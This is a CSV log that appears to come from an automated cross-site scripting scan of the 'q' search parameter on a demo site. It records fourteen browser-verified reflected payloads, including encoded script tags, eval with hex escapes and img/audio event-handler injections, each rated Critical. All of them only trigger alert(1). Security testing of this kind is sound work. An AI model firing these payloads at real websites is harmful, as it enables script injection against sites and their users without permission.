Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 17:58:53.600,2026-01-10 17:58:53.720,0.120,https://demo-knsl.onrender.com/search,GET,q,<script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.333,2026-01-10 17:58:53.721,0.387,https://demo-knsl.onrender.com/search,GET,q,<audio src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.622,2026-01-10 17:58:53.735,0.113,https://demo-knsl.onrender.com/search,GET,q,<script>alert&#x28;1&#x29;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.669,2026-01-10 17:58:53.799,0.130,https://demo-knsl.onrender.com/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.703,2026-01-10 17:58:53.830,0.127,https://demo-knsl.onrender.com/search,GET,q,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.711,2026-01-10 17:58:53.830,0.118,https://demo-knsl.onrender.com/search,GET,q,<img src=x onafterprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.696,2026-01-10 17:58:53.832,0.136,https://demo-knsl.onrender.com/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.720,2026-01-10 17:58:53.833,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onafterupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.721,2026-01-10 17:58:53.834,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.735,2026-01-10 17:58:53.845,0.110,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforecopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.799,2026-01-10 17:58:53.908,0.109,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforecut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.830,2026-01-10 17:58:53.935,0.106,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforedeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.833,2026-01-10 17:58:53.937,0.104,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforeprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.832,2026-01-10 17:58:53.941,0.109,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforepaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
